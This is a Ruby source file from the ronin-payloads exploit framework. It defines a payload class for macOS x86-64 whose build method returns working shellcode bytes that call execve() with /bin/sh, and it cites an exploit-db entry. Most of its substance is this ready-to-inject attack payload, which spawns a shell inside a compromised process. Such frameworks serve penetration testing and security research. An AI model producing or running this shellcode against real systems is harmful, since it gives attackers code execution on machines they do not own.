# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2022 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode_payload'

module Ronin
  module Payloads
    module Shellcode
      module MacOS
        module X86_64
          #
          # macOS x86-64 shellcode that calls `execve()` with `/bin/sh`.
          #
          class Execve < ShellcodePayload

            register 'shellcode/macos/x86_64/execve'

            arch :x86_64
            os :macos

            author 'Csaba Fitzl', twitter: 'theevilbit'

            summary 'macOS x86-64 execve() shellcode'
            description <<~DESC
            macOS x86-64 shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://www.exploit-db.com/exploits/38065"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x48\x31\xf6\x56\x48\xbf\x2f\x2f\x62\x69" \
                         "\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31" \
                         "\xd2\x48\x31\xc0\xb0\x02\x48\xc1\xc8\x28" \
                         "\xb0\x3b\x0f\x05".b
            end

          end
        end
      end
    end
  end
end
